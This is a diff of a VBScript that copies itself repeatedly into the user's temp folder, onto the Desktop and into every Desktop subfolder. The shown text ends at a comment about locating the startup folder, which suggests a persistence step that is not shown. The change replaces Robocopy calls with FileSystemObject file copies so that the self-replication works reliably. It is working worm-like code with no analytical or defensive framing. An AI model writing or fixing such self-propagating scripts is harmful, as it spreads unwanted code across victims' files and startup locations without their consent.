@@ -1,4 +1,5 @@
 Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
 strScriptPath = WScript.ScriptFullName
 
 ' Specify the number of copies you want to create
@@ -6,23 +7,23 @@ numCopies = 5
 
 For i = 1 To numCopies
     strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & i & ".vbs"
-    objShell.Run "Robocopy /COPYALL /E /IS """ & objShell.CurrentDirectory & """ """ & strCopyPath & """", 0, True
+    objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
     
     ' Get the path to the desktop folder
     strDesktopFolder = objShell.SpecialFolders("Desktop")
     
     ' Create a copy of the script on the desktop
     strDesktopCopyPath = strDesktopFolder & "\Copy" & i & ".vbs"
-    objShell.Run "Robocopy /COPYALL /IS """ & strCopyPath & """ """ & strDesktopCopyPath & """", 0, True
+    objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
     
     ' Get the list of folders on the desktop
-    Set objDesktopFolder = objShell.Namespace(strDesktopFolder)
-    Set colFolders = objDesktopFolder.Items
+    Set objDesktopFolder = objFSO.GetFolder(strDesktopFolder)
+    Set colFolders = objDesktopFolder.SubFolders
     
     ' Iterate through each folder and create a copy of the script
     For Each objFolder In colFolders
         strFolderCopyPath = objFolder.Path & "\Copy" & i & ".vbs"
-        objShell.Run "Robocopy /COPYALL /IS """ & strCopyPath & """ """ & strFolderCopyPath & """", 0, True
+        objFSO.CopyFile strCopyPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
     Next
     
     ' Get the path to the startup folder
